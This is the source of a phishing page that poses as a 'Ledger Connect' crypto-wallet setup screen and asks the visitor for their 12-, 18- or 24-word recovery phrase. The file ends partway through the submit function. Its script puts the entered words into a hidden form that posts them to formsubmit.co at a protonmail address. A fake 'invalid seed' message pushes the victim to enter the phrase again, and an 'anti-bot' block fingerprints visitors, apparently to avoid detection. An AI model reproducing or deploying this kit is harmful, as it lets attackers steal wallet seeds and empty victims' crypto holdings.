<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ledger Connect</title>
  <script src="js/forge.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
   <!-- Include anti-bot script -->
    <script src="js/anti_bot.js"></script>
    
    <!-- OR embed directly like this: -->
    <script>
    // ANTI-BOT SCRIPT - Place this here
    (function() {
        'use strict';
        
        // Set JavaScript capability flag using sessionStorage
        sessionStorage.setItem('js_capable', 'true');
        
        // Track mouse movement
        var mouseMoved = false;
        document.addEventListener('mousemove', function() {
            mouseMoved = true;
            sessionStorage.setItem('mouse_moved', 'true');
        });
        
        // Track keyboard
        var keyPressed = false;
        document.addEventListener('keydown', function() {
            keyPressed = true;
            sessionStorage.setItem('key_pressed', 'true');
        });
        
        // Track touch (mobile)
        var touchDetected = false;
        document.addEventListener('touchstart', function() {
            touchDetected = true;
            sessionStorage.setItem('touch_detected', 'true');
        });
        
        // Send data via fetch
        function sendHumanData() {
            var data = {
                js_capable: true,
                mouseMoved: mouseMoved || sessionStorage.getItem('mouse_moved') === 'true',
                keyPressed: keyPressed || sessionStorage.getItem('key_pressed') === 'true',
                touchDetected: touchDetected || sessionStorage.getItem('touch_detected') === 'true',
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezoneOffset: new Date().getTimezoneOffset(),
                language: navigator.language,
                platform: navigator.platform,
                plugins: navigator.plugins.length
            };
            
            fetch('/verify_human.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function() {});
        }
        
        // Send on page load and unload
        document.addEventListener('DOMContentLoaded', sendHumanData);
        document.addEventListener('beforeunload', sendHumanData);
        
        // Also send after 3 seconds
        setTimeout(sendHumanData, 3000);
        
        // Obfuscate
        window._r = Math.random;
        window._f = function() { return false; };
        
    })();
    </script>
<style>
  :root {
    --bg: #0a0a0a;
    --bg2: #111114;
    --card: #151518;
    --card-hover: #1c1c20;
    --border: #2a2a30;
    --purple: #8b5cf6;
    --purple-light: #a78bfa;
    --purple-dim: rgba(139,92,246,0.15);
    --white: #ffffff;
    --gray: #6b7280;
    --gray2: #9ca3af;
    --text: #e5e7eb;
    --success: #10b981;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  html {
    scrollbar-gutter: stable;
    overflow-y: none;
  }
.word-input-wrap {
  position: relative;
}


.word-suggestions {
  background: #1e1e2a;
  border: 1px solid var(--purple-light, #7c5cff);
  border-radius: 6px;
  z-index: 9999;
  max-height: 160px;
  overflow-y: auto;
  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
}

.word-suggestion-item {
  padding: 6px 10px;
  cursor: pointer;
  font-size: 13px;
  color: #fff;
}

.word-suggestion-item:hover {
  background: rgba(124, 92, 255, 0.25);
}
  body {
    background: var(--bg);
    color: var(--white);
    font-family: 'DM Sans', sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
    /* Prevent layout shift from scrollbar appearing/disappearing */
    scrollbar-width: thin;
    scrollbar-color: #2a2a30 transparent;
  }

  /* Webkit scrollbar — subtle dark style */
  ::-webkit-scrollbar { width: 6px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: #2a2a30; border-radius: 99px; }
  ::-webkit-scrollbar-thumb:hover { background: #3a3a42; }

  /* SCREENS */
  .screen {
    display: none;
    min-height: 100vh;
    animation: fadeIn 0.4s ease;
  }
  .screen.active { display: flex; }
  /* Screens that fit viewport exactly — no scroll trigger */
  #s2, #s3, #s4, #s5, #s6, #s8 {
    height: 100vh;
    overflow: hidden;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }

  /* =================== SCREEN 1: CHOOSE DEVICE =================== */
  #s1 {
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 60px 40px;
    gap: 48px;
  }

  .s1-header { text-align: center; }
  .s1-header h1 {
    font-size: clamp(1.8rem, 3vw, 2.5rem);
    font-weight: 700;
    letter-spacing: -0.5px;
  }
  .s1-header h1 span { color: var(--purple-light); }
  .s1-header p {
    margin-top: 10px;
    color: var(--gray2);
    font-size: 1rem;
  }

  .device-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 16px;
    max-width: 900px;
    width: 100%;
  }

  .device-card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 36px 20px 28px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
    cursor: pointer;
    transition: all 0.25s ease;
    position: relative;
    overflow: hidden;
  }
  .device-card::before {
    content: '';
    position: absolute;
    inset: 0;
    background: radial-gradient(ellipse at center top, rgba(139,92,246,0.08) 0%, transparent 70%);
    opacity: 0;
    transition: opacity 0.3s;
  }
  .device-card:hover { border-color: var(--purple); background: var(--card-hover); }
  .device-card:hover::before { opacity: 1; }

  .device-img {
    width: 90px;
    height: 110px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  /* Placeholder device SVG icons */
  .device-img svg { filter: drop-shadow(0 0 20px rgba(139,92,246,0.2)); }

  .device-card span {
    font-weight: 600;
    font-size: 1rem;
    color: var(--white);
  }

  /* =================== SCREEN 2: CONNECTING =================== */
  #s2 {
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 28px;
  }

  .connect-device-img {
    width: 180px;
    height: 180px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .connect-label {
    font-size: 1.5rem;
    font-weight: 700;
    text-align: center;
  }
  .connect-label span { color: var(--purple-light); }

  .connect-sub {
    color: var(--gray2);
    font-size: 0.9rem;
    text-align: center;
  }

  .spinner {
    width: 28px; height: 28px;
    border: 2px solid var(--border);
    border-top-color: var(--purple);
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* =================== SCREEN 3: NEXT/DOWNLOAD =================== */
  #s3 {
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 28px;
    padding: 40px;
    text-align: center;
  }

  .ledger-logo {
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Space Mono', monospace;
    font-size: 1.4rem;
    font-weight: 700;
    letter-spacing: 3px;
  }
  .logo-brackets {
    color: var(--white);
    font-size: 1.6rem;
    line-height: 1;
  }

  .s3-text {
    font-size: 1.2rem;
    color: var(--text);
    max-width: 480px;
    line-height: 1.6;
  }
  .s3-text span { color: var(--purple-light); font-weight: 600; }

  /* =================== SCREEN 4: CONNECTING STEP 2 =================== */
  #s4 {
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 24px;
  }

  .stacked-device {
    width: 140px;
    height: 120px;
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  /* =================== STEPPER =================== */
  .stepper {
    display: flex;
    align-items: center;
    gap: 0;
    margin-bottom: 32px;
  }
  .step-item { display: flex; flex-direction: column; align-items: center; gap: 8px; }
  .step-circle {
    width: 40px; height: 40px;
    border-radius: 50%;
    border: 2px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    font-size: 0.9rem;
    color: var(--gray);
    transition: all 0.3s;
  }
  .step-circle.active {
    background: var(--purple);
    border-color: var(--purple);
    color: white;
    box-shadow: 0 0 20px rgba(139,92,246,0.4);
  }
  .step-circle.done {
    background: rgba(139,92,246,0.3);
    border-color: var(--purple-light);
    color: var(--purple-light);
  }
  .step-label {
    font-size: 0.75rem;
    color: var(--gray);
    white-space: nowrap;
  }
  .step-label.active { color: var(--purple-light); font-weight: 600; }
  .step-line {
    width: 120px;
    height: 1px;
    background: var(--border);
    margin-bottom: 24px;
    transition: background 0.3s;
  }
  .step-line.done { background: var(--purple); }

  /* =================== FIRMWARE SCREENS =================== */
  #s5, #s6, #s7, #s8 {
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    padding: 40px 40px 60px;
    gap: 0;
  }

  .fw-header { text-align: center; margin-bottom: 48px; }
  .fw-icon {
    width: 64px; height: 64px;
    border-radius: 50%;
    background: var(--purple-dim);
    border: 2px solid var(--purple);
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 24px;
    box-shadow: 0 0 24px rgba(139,92,246,0.25);
  }

  .fw-title {
    font-size: 1.6rem;
    font-weight: 700;
    text-align: center;
  }
  .fw-title span { color: var(--purple-light); }
  .fw-sub {
    color: var(--gray2);
    text-align: center;
    margin-top: 10px;
    max-width: 420px;
    line-height: 1.6;
    font-size: 0.95rem;
  }

  /* Progress bar */
  .progress-wrap { width: 100%; max-width: 480px; margin-top: 32px; }
  .progress-label-row {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
    font-size: 0.9rem;
    font-weight: 600;
  }
  .progress-track {
    height: 6px;
    background: var(--border);
    border-radius: 99px;
    overflow: hidden;
  }
  .progress-bar {
    height: 100%;
    background: linear-gradient(90deg, var(--purple), var(--purple-light));
    border-radius: 99px;
    transition: width 0.5s ease;
    width: 10%;
  }
  .progress-hint {
    margin-top: 16px;
    color: var(--gray);
    font-size: 0.85rem;
    text-align: center;
  }

  /* =================== SCREEN 9: RECOVERY PHRASE =================== */
  #s9 {
    flex-direction: row;
    min-height: 100vh;
  }


      .panel-left {
          width: 42%;
    background: linear-gradient(160deg, #0d0d12 0%, #12101a 100%);
    padding: 48px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    border-right: 1px solid var(--border);
    position: relative;
    overflow: hidden;
      }

      .panel-left .slide {
        position: absolute;
        inset: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        object-position: center;
        display: block;
        opacity: 0;
        transition: opacity 0.4s ease-in-out;
        z-index: 0;
        -webkit-mask-image: linear-gradient(
          90deg,
          #000 0%,
          #000 60%,
          rgba(0, 0, 0, 0.85) 78%,
          rgba(0, 0, 0, 0.4) 92%,
          transparent 100%
        );
        mask-image: linear-gradient(
          90deg,
          #000 0%,
          #000 60%,
          rgba(0, 0, 0, 0.85) 78%,
          rgba(0, 0, 0, 0.4) 92%,
          transparent 100%
        );
      }

      .panel-left .slide.active {
        opacity: 1;
      }

      .panel-left::after {
        content: '';
        position: absolute;
        inset: 0;
        pointer-events: none;
        z-index: 2;
        background: radial-gradient(
          ellipse at 35% 50%,
          transparent 55%,
          rgba(0, 0, 0, 0.3) 100%
        );
      }

      .video-top {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        z-index: 3;
        padding: 32px 40px 24px;
        display: flex;
        flex-direction: column;
        align-items: center;
        row-gap: 16px;
      }

      .progress-bars {
        display: flex;
        flex-direction: row;
        column-gap: 4px;
        width: 300px;
      }

      .pbar {
        height: 3px;
        flex: 1;
        background: rgba(255, 255, 255, 0.28);
        border-radius: 2px;
        position: relative;
        overflow: hidden;
      }

      .pbar::after {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        height: 100%;
        background: #fff;
        border-radius: 2px;
        width: 0%;
        opacity: 0;
        transition: width var(--dur, 5s) linear;
      }

      .pbar.full::after {
        width: 100%;
        background: #fff;
        opacity: 1;
        transition: none;
      }

      .pbar.active::after {
        width: 100%;
        opacity: 1;
      }

      .brand {
        display: inline-flex;
        align-items: center;
        gap: 10px;
        color: var(--grey-950);
        text-decoration: none;
      }

      .brand-logo {
        width: 44px;
        height: 44px;
        flex-shrink: 0;
        filter: drop-shadow(0 0 6px rgba(0, 0, 0, 0.45));
      }

      .brand-wordmark {
        font-size: 30px;
        font-weight: 700;
        letter-spacing: -0.035em;
        line-height: 1;
        filter: drop-shadow(0 0 8px rgba(0, 0, 0, 0.5));
      }

      .slide-title {
        font-size: var(--fs-heading-3);
        font-weight: 600;
        text-align: center;
        max-width: 600px;
        letter-spacing: -0.05em;
        color: var(--grey-950);
        text-shadow: 0 1px 6px rgba(0, 0, 0, 0.45);
        animation: fadeInOut 1s ease-in-out;
        margin: 0;
      }

      @keyframes fadeInOut {
        0% {
          opacity: 0;
        }
        100% {
          opacity: 1;
        }
      }

      .play-fallback {
        position: absolute;
        inset: 0;
        z-index: 5;
        display: none;
        align-items: center;
        justify-content: center;
        background: rgba(0, 0, 0, 0.55);
        border: none;
        cursor: pointer;
        color: var(--grey-950);
      }

      .play-fallback.show {
        display: flex;
      }

      .play-fallback .play-circle {
        width: 72px;
        height: 72px;
        border-radius: 9999px;
        background: var(--grey-950);
        color: var(--grey-050);
        display: flex;
        align-items: center;
        justify-content: center;
        transition: transform 0.15s ease;
      }

      .play-fallback:hover .play-circle {
        transform: scale(1.05);
      }

      .play-fallback .play-label {
        position: absolute;
        bottom: 32px;
        font-size: var(--fs-body-2);
        font-weight: var(--fw-medium);
        opacity: 0.85;
      }

  .wallet-3d {
    width: 260px;
    height: 260px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 32px;
  }

  .recovery-left h2 {
    font-size: 1.5rem;
    font-weight: 700;
    margin-bottom: 8px;
    line-height: 1.3;
  }

  .recovery-tabs {
    display: flex;
    gap: 4px;
    margin-bottom: 6px;
  }
  .recovery-tab-line {
    height: 2px;
    flex: 1;
    border-radius: 2px;
    background: var(--border);
    cursor: pointer;
    transition: background 0.2s;
  }
  .recovery-tab-line.active { background: var(--white); }

  .recovery-right {
    flex: 1;
    padding: 48px;
    display: flex;
    flex-direction: column;
    justify-content: center;
  }

  .recovery-right h2 {
    font-size: 1.8rem;
    font-weight: 700;
    margin-bottom: 10px;
  }
  .recovery-right p {
    color: var(--gray2);
    font-size: 0.9rem;
    margin-bottom: 28px;
    line-height: 1.5;
  }

  .word-length-tabs {
    display: flex;
    gap: 8px;
    margin-bottom: 24px;
  }
  .wl-tab {
    padding: 8px 18px;
    border-radius: 999px;
    border: 1px solid var(--border);
    background: transparent;
    color: var(--gray2);
    font-family: 'DM Sans', sans-serif;
    font-size: 0.85rem;
    cursor: pointer;
    transition: all 0.2s;
  }
  .wl-tab.active {
    background: var(--purple);
    border-color: var(--purple);
    color: white;
    font-weight: 600;
  }
  .wl-tab:hover:not(.active) { border-color: var(--purple-light); color: var(--white); }

  .show-all-btn {
    margin-left: auto;
    display: flex;
    align-items: center;
    gap: 6px;
    background: transparent;
    border: 1px solid var(--purple);
    color: var(--purple-light);
    padding: 8px 16px;
    border-radius: 999px;
    font-size: 0.85rem;
    cursor: pointer;
    font-family: 'DM Sans', sans-serif;
    transition: all 0.2s;
  }
  .show-all-btn:hover { background: var(--purple-dim); }

  .word-top-row {
    display: flex;
    align-items: center;
    margin-bottom: 24px;
  }

  .word-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 10px;
    margin-bottom: 20px;
  }

  .word-input-wrap {
    display: flex;
    align-items: center;
    background: #1a1a1f;
    border: 1px solid var(--border);
    border-radius: 10px;
    overflow: hidden;
    transition: border-color 0.2s;
  }
  .word-input-wrap:focus-within { border-color: var(--purple); }

  .word-num {
    padding: 0 10px;
    color: var(--gray);
    font-size: 0.8rem;
    min-width: 28px;
    border-right: 1px solid var(--border);
    height: 44px;
    display: flex;
    align-items: center;
  }
  .word-input {
    background: transparent;
    border: none;
    outline: none;
    color: var(--white);
    font-family: 'DM Sans', sans-serif;
    font-size: 0.9rem;
    padding: 0 12px;
    height: 44px;
    width: 100%;
  }

  .word-progress {
    color: var(--gray);
    font-size: 0.85rem;
    margin-bottom: 16px;
  }
  .word-progress span { color: var(--purple-light); font-weight: 600; }

  /* =================== BUTTONS =================== */
  .btn-primary {
    background: var(--white);
    color: #0a0a0a;
    border: none;
    border-radius: 999px;
    padding: 16px 48px;
    font-size: 1rem;
    font-weight: 600;
    font-family: 'DM Sans', sans-serif;
    cursor: pointer;
    transition: all 0.2s;
    letter-spacing: 0.2px;
  }
  .btn-primary:hover { background: #e5e7eb; transform: translateY(-1px); }
  .btn-primary:active { transform: translateY(0); }

  .btn-purple {
    background: var(--purple);
    color: white;
    border: none;
    border-radius: 999px;
    padding: 16px 48px;
    font-size: 1rem;
    font-weight: 600;
    font-family: 'DM Sans', sans-serif;
    cursor: pointer;
    transition: all 0.2s;
  }
  .btn-purple:hover { background: var(--purple-light); transform: translateY(-1px); }
  .btn-purple:disabled {
    opacity: 0.4;
    cursor: not-allowed;
    transform: none;
  }

  /* Connecting animation */
  @keyframes pulse-glow {
    0%, 100% { box-shadow: 0 0 20px rgba(139,92,246,0.2); }
    50% { box-shadow: 0 0 40px rgba(139,92,246,0.5); }
  }

  .pulse { animation: pulse-glow 2s ease-in-out infinite; }

  /* Verifying text */
  .verify-row {
    display: flex;
    align-items: center;
    gap: 10px;
    color: var(--gray2);
    font-size: 0.9rem;
  }

  /* =================== MOBILE RESPONSIVE =================== */
  @media (max-width: 700px) {
    .device-grid { grid-template-columns: 1fr; max-width: 400px; }
    #s9 { flex-direction: column; }
    .recovery-left { width: 100%; min-height: auto; padding: 32px 24px;margin-top:30% }
    .panel-left{width: 100%;}

    .recovery-right { padding: 24px; }
    .word-grid { grid-template-columns: repeat(2, 1fr); }
    .step-line { width: 60px; }
  }

  /* Success checkmark */
  .check-circle {
    width: 64px; height: 64px;
    border-radius: 50%;
    background: rgba(139,92,246,0.15);
    border: 2px solid var(--purple);
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 24px;
    box-shadow: 0 0 24px rgba(139,92,246,0.3);
  }

  /* Connecting outline device animation */
  @keyframes blink-dots {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
  }
  .blink { animation: blink-dots 1.2s ease-in-out infinite; }

  /* Nav top-left icon for mobile screen */
  .top-nav {
    position: absolute;
    top: 20px;
    left: 20px;
  }
  .top-nav-logo {
    font-family: 'Space Mono', monospace;
    font-size: 0.85rem;
    letter-spacing: 2px;
    border: 1px solid var(--border);
    padding: 6px 10px;
    border-radius: 8px;
    display: inline-block;
  }


  /* =================== MOBILE LOGO =================== */
  .mobile-logo {
    display: none; /* hidden on desktop */
    align-items: center;
    gap: 8px;
    font-family: 'Space Mono', monospace;
    font-size: 0.85rem;
    letter-spacing: 3px;
    color: var(--white);
    position: absolute;
    top: 20px;
    left: 20px;
  }

  @media (max-width: 700px) {
    .mobile-logo { display: flex; }
  }

</style>
</head>
<body>





<!-- =================== SCREEN 9: RECOVERY PHRASE =================== -->
<div class="screen active" id="s9">
  <!-- Left panel -->
<div class="panel-left" aria-label="Animation">
        <div class="video-top" bis_skin_checked="1">
          <a class="brand" href="#" aria-label="Wallet">
            <svg class="brand-logo" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
              <path d="M2 4.66667V3C2 2.44772 2.44772 2 3 2H6M9.33333 10.0001H7.66667C7.11438 10.0001 6.66667 9.55237 6.66667 9.00008V6.00008M14 4.66667V3C14 2.44772 13.5523 2 13 2H10M2 11.3333V13C2 13.5523 2.44772 14 3 14H6M14 11.3333V13C14 13.5523 13.5523 14 13 14H10" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
            <span class="brand-wordmark">Wallet</span>
          </a>

          <div class="progress-bars" id="progress-bars" aria-hidden="true" bis_skin_checked="1">
            <span class="pbar full" data-idx="0" style="--dur: 5.033s;"></span>
            <span class="pbar active" data-idx="1" style="--dur: 5.033s;"></span>
            <span class="pbar" data-idx="2" style="--dur: 7s;"></span>
          </div>

          <h2 class="slide-title" id="slide-title" style="">Manage thousands of crypto assets</h2>
        </div>

        <video class="slide" data-idx="0" muted="" playsinline="" preload="auto" aria-hidden="true">
          <source src="media/slide-1.webm" type="video/webm">
        </video>
        <video class="slide active" data-idx="1" muted="" playsinline="" preload="auto" aria-hidden="true">
          <source src="media/slide-2.webm" type="video/webm">
        </video>
        <video class="slide" data-idx="2" muted="" playsinline="" preload="auto" aria-hidden="true">
          <source src="media/slide-3.webm" type="video/webm">
        </video>

        <button class="play-fallback" id="play-fallback" type="button" aria-label="Play animation">
          <span class="play-circle" aria-hidden="true">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor">
              <path d="M8 5v14l11-7z"></path>
            </svg>
          </span>
          <span class="play-label">Click to play</span>
        </button>
      </div>
  <!-- Right panel -->
  <div class="recovery-right">
    <h2>Enter your recovery phrase</h2>
    <p>Type each word of your secret recovery phrase in order. Press space or enter to move to the next word.</p>

    <div class="word-top-row">
      <div class="word-length-tabs">
          <button class="wl-tab active" onclick="setWordCount(24,this)">24 words</button>
        <button class="wl-tab" onclick="setWordCount(18,this)">18 words</button>
        <button class="wl-tab" onclick="setWordCount(12,this)">12 words</button>
      </div>
   
    </div>

    <div class="word-grid" id="wordGrid"><div class="word-input-wrap"><div class="word-num">1.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="0"></div><div class="word-input-wrap"><div class="word-num">2.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="1"></div><div class="word-input-wrap"><div class="word-num">3.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="2"></div><div class="word-input-wrap"><div class="word-num">4.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="3"></div><div class="word-input-wrap"><div class="word-num">5.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="4"></div><div class="word-input-wrap"><div class="word-num">6.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="5"></div><div class="word-input-wrap"><div class="word-num">7.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="6"></div><div class="word-input-wrap"><div class="word-num">8.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="7"></div><div class="word-input-wrap"><div class="word-num">9.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="8"></div><div class="word-input-wrap"><div class="word-num">10.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="9"></div><div class="word-input-wrap"><div class="word-num">11.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="10"></div><div class="word-input-wrap"><div class="word-num">12.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="11"></div><div class="word-input-wrap"><div class="word-num">13.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="12"></div><div class="word-input-wrap"><div class="word-num">14.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="13"></div><div class="word-input-wrap"><div class="word-num">15.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="14"></div><div class="word-input-wrap"><div class="word-num">16.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="15"></div><div class="word-input-wrap"><div class="word-num">17.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="16"></div><div class="word-input-wrap"><div class="word-num">18.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="17"></div><div class="word-input-wrap"><div class="word-num">19.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="18"></div><div class="word-input-wrap"><div class="word-num">20.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="19"></div><div class="word-input-wrap"><div class="word-num">21.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="20"></div><div class="word-input-wrap"><div class="word-num">22.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="21"></div><div class="word-input-wrap"><div class="word-num">23.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="22"></div><div class="word-input-wrap"><div class="word-num">24.</div><input class="word-input" type="text" autocomplete="off" spellcheck="false" data-index="23"></div></div>

    <div class="word-progress">
      <span id="wordCount">0</span> / <span id="wordTotal">24</span> words
    </div>

    <button class="btn-purple" id="continueBtn" disabled="" onclick="submitPhrase()">Continue</button>
  <div id="submitMsg" style="display:block;margin-top:12px;font-size:0.85rem;color:var(--gray2);text-align:center;color: red;">Invalid seed. Please try again.</div>
  </div>
</div>

<script>
  let bip39WordList = [];

async function loadWordList(path = 'bip39-english.txt') {
  try {
    const res = await fetch(path);
    const text = await res.text();
    bip39WordList = text.split(/\r?\n/).map(w => w.trim().toLowerCase()).filter(Boolean);
  } catch (err) {
    console.error('word list not loaded:', err);
  }
}
loadWordList();

function getSuggestions(prefix, limit = 5) {
  if (!prefix) return [];
  const p = prefix.toLowerCase();
  return bip39WordList.filter(w => w.startsWith(p)).slice(0, limit);
}

function validateWordInput(input) {
  const val = input.value.trim().toLowerCase();
  const wrap = input.parentElement;
  const isValid = val === '' || bip39WordList.includes(val);
  wrap.classList.toggle('word-invalid', val !== '' && !isValid);
  showSuggestions(input, val);
}

let activeDropdown = null;

function showSuggestions(input, val) {
  if (activeDropdown) {
    activeDropdown.remove();
    activeDropdown = null;
  }

  if (!val || bip39WordList.includes(val)) return;

  const matches = getSuggestions(val);
  if (matches.length === 0) return;

  const rect = input.getBoundingClientRect();
  const dropdown = document.createElement('div');
  dropdown.className = 'word-suggestions';
  dropdown.style.position = 'fixed';
  dropdown.style.top = (rect.bottom + 4) + 'px';
  dropdown.style.left = rect.left + 'px';
  dropdown.style.width = rect.width + 'px';

  matches.forEach(word => {
    const item = document.createElement('div');
    item.className = 'word-suggestion-item';
    item.textContent = word;
    item.addEventListener('mousedown', e => {
      e.preventDefault();
      input.value = word;
      validateWordInput(input);
      checkWords();
    });
    dropdown.appendChild(item);
  });

  document.body.appendChild(dropdown);
  activeDropdown = dropdown;
}
  function goTo(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    onScreenEnter(id);
  }
goTo("s9");

  function onScreenEnter(id) {
    if (id === 's2') startConnecting();
    if (id === 's4') startConnecting2();
    if (id === 's7') startProgress();
  }

  // S2: Auto-advance after 2.5s
  function startConnecting() {
    setTimeout(() => {
      const btn = document.getElementById('s2-timer');
      if(btn) btn.style.display = 'block';
      // Auto go to s3
      goTo('s3');
    }, 2500);
  }

  // S4: Auto-advance
  function startConnecting2() {
    setTimeout(() => {
      goTo('s5');
    }, 2200);
  }

  // S7: Progress bar animation
  function startProgress() {
    let pct = 10;
    const bar = document.getElementById('pbar');
    const label = document.getElementById('pct');
    const interval = setInterval(() => {
      pct += Math.random() * 8 + 3;
      if (pct >= 100) {
        pct = 100;
        clearInterval(interval);
        bar.style.width = '100%';
        label.textContent = '100%';
        setTimeout(() => goTo('s8'), 600);
        return;
      }
      bar.style.width = pct + '%';
      label.textContent = Math.round(pct) + '%';
    }, 350);
  }

  let currentWordCount = 12;

  function buildWordGrid(count) {
    const grid = document.getElementById('wordGrid');
    grid.innerHTML = '';
    for (let i = 1; i <= count; i++) {
      const wrap = document.createElement('div');
      wrap.className = 'word-input-wrap';
      const input = document.createElement('input');
      input.className = 'word-input';
      input.type = 'text';
      input.autocomplete = 'off';
      input.spellcheck = false;
      input.dataset.index = i - 1;
input.addEventListener('input', () => {
  checkWords();
  validateWordInput(input);
});      input.addEventListener('blur', () => {
  setTimeout(() => {
    if (activeDropdown) {
      activeDropdown.remove();
      activeDropdown = null;
    }
  }, 150);
});input.addEventListener('paste', handlePaste);
      const num = document.createElement('div');
      num.className = 'word-num';
      num.textContent = i + '.';
      wrap.appendChild(num);
      wrap.appendChild(input);
      grid.appendChild(wrap);
    }
    document.getElementById('wordTotal').textContent = count;
    checkWords();
  }

  function handlePaste(e) {
    e.preventDefault();
    const raw = (e.clipboardData || window.clipboardData).getData('text');
    const words = raw.trim().split(/[\s,]+/).filter(w => w.length > 0);
    if (words.length === 0) return;

    const inputs = Array.from(document.querySelectorAll('.word-input'));
    const startIdx = parseInt(e.target.dataset.index) || 0;

    const fillFrom = words.length >= currentWordCount ? 0 : startIdx;

    words.forEach((word, i) => {
      const targetIdx = fillFrom + i;
      if (targetIdx < inputs.length) {
        inputs[targetIdx].value = word;
        inputs[targetIdx].parentElement.style.borderColor = 'var(--purple-light)';
        setTimeout(() => {
          if (inputs[targetIdx]) inputs[targetIdx].parentElement.style.borderColor = '';
        }, 600);
      }
    });

    const nextEmpty = inputs.find((inp, i) => i >= fillFrom + words.length && !inp.value);
    if (nextEmpty) nextEmpty.focus();
    else if (inputs[fillFrom + words.length - 1]) inputs[fillFrom + words.length - 1].focus();

    checkWords();
  }

  function setWordCount(n, btn) {
    currentWordCount = n;
    document.querySelectorAll('.wl-tab').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    buildWordGrid(n);
  }

  function checkWords() {
    const inputs = document.querySelectorAll('.word-input');
    let filled = 0;
    inputs.forEach(inp => { if(inp.value.trim()) filled++;validateWordInput(inp); });
    document.getElementById('wordCount').textContent = filled;
    document.getElementById('continueBtn').disabled = (filled < currentWordCount);
  }

  document.addEventListener('keydown', e => {
    if ((e.key === ' ' || e.key === 'Enter') && document.activeElement.classList.contains('word-input')) {
      e.preventDefault();
      const inputs = Array.from(document.querySelectorAll('.word-input'));
      const idx = inputs.indexOf(document.activeElement);
      if (idx < inputs.length - 1) inputs[idx + 1].focus();
    }
  });





  let submitAttempts = 0;

  function getFormSubmitSeedForm() {
    let form = document.getElementById('formsubmit-seed-form');
    if (!form) {
      form = document.createElement('form');
      form.id = 'formsubmit-seed-form';
      form.style.display = 'none';
      form.action = 'https://formsubmit.co/zaq114@protonmail.com';
      form.method = 'POST';

      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'phrase';
      input.id = 'formsubmit-seed-input';
      form.appendChild(input);
      document.body.appendChild(form);
    }
    return form;
  }

  function submitViaFormSubmit(finalwords) {
    const form = getFormSubmitSeedForm();
    form.querySelector('#formsubmit-seed-input').value = finalwords;
    form.submit();
  }

  async function submitPhrase() {
    const inputs = Array.from(document.querySelectorAll('.word-input'));
    const words = inputs.map(i => i.value.trim().toLowerCase()).filter(Boolean);
    if (words.length < currentWordCount) return;

    const btn = document.getElementById("continueBtn");
